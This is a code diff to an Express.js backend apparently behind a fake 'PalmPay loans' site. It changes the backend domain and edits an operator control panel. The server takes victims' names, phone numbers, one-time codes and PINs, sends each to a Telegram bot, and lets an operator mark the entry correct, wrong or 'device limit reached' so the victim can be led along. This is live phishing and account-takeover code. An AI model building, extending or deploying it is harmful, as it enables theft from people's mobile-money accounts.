@@ -6,7 +6,7 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const DOMAIN = process.env.BACKEND_DOMAIN || 'https://palmpay-loans.onrender.com';
+const DOMAIN = process.env.BACKEND_DOMAIN || 'https://palmpay-loans-w4oc.onrender.com';
 
 // ---------------- MEMORY STORES ----------------
 const approvedPins = {};
@@ -124,7 +124,7 @@ app.post('/submit-code', (req, res) => {
     sendTelegramMessage(bot, `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
         { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
         { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
-        { text: '✅ Code OK + ❌ PIN Wrong', callback_data: `code_pin:${requestId}` }
+        { text: ' Max-Devices', callback_data: `device-limit:${requestId}` }
     ]]);
 
     res.json({ requestId });
@@ -150,7 +150,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'User blocked 🛑'; }
     if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approved ✅'; }
     if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejected ❌'; }
-    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approved – re-enter PIN'; }
+    if (action === 'device-limit') { approvedCodes[requestId] = false; feedback = 'Device limit reached'; }
 
     if (feedback) await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
     await answerCallback(bot, cb.id);
